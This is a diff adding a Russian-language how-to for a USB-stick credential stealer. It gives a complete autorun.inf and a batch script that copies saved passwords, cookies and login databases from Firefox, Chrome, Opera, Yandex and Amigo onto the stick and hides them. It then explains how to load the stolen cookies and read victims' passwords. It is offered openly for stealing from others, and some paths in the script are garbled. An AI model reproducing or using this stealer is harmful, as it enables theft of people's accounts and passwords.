@@ -1,0 +1,56 @@
+
+Сегодня речь пойдёт о стиллере внутри флешки, с помощью которого вы сможете украсть все пароли из браузера жертвы. И так, для начала нам понадобится флэшка. В этой флэшке создаём текстовые файлы:
+
+autorun.inf
+и
+stealer.bat
+
+Не забудьте включить отображение расширений файлов, чтоб можно было изменить txt на inf и bat. В файле autorun.inf пишем:
+
+*AutoRun*
+Open="stealer.bat"
+
+В файле stealer.bat пишем:
+
+@echo off
+md %~d0Mozilla
+md %~d00pera
+md %~d0Google
+md %~d0Yandex
+md %~d0Amigo
+CD/D %APPDATA%OperaOpera
+cls
+copy /y wand.dat %~d0Opera
+copy /y cookies.dat %~d0Opera
+cd %AppData%MozillaFirefoxProfiles\*.default
+copy /y cookies.sqlite %~d0Mozilla
+copy /y key3.db %~d0Mozilla
+copy /y signons.sqlite %~d0Mozilla
+copy /y %AppData%MozillaFirefoxProfiles\*.default %~d0Mozilla
+cd %localappdata%GoogleChromeUser DataDefault
+cls
+copy /y "%localappdata%GoogleChromeUser DataDefaultLogin Data" "%~d0Google"
+cd %localappdata%YandexYandexBrowserUser DataDefault
+copy /y "%localappdata%YandexYandexBrowserUser DataDefaultLogin Data" "%~d0Yandex"
+cd %localappdata%AmigoUser DataDefault
+copy /y "%localappdata%AmigoUser DataDefaultLogin Data" "%~d0Amigo"
+cls
+ATTRIB -R -A -S -H
+attrib +h %~d0Mozilla
+attrib +h %~d0Opera
+attrib +h %~d0Google
+attrib +h %~d0Yandex
+attrib +h %~d0Amigo
+attrib +h %~d0search.bat
+attrib +h %~d0new
+attrib +h %~d0autorun.inf
+del: autorun.inf?
+
+Сохраняем и закрываем! Всё, стиллер готов, но есть нюансы в Windows 10 (и 8) наш авторан не сработает, там эта возможность банально отключена. Но, благо, процесс копирования куки проходит очень быстро, поэтому чтобы сесть за чужой комп на минуту много ума не надо.
+
+Ну вот, спиздили вы куки, что дальше делать?
+
+Нажимаем Windows+R и вводим:
+%appdata%
+
+И там удаляем папку браузера, куки которого мы хотим посмотреть и копируем папку с куки с нашей флешки и переносим туда. Теперь качаем программу WebBrowserPassView и запускаем, всё. Видим на каких сайтах какие учётные записи и какие там пароли!
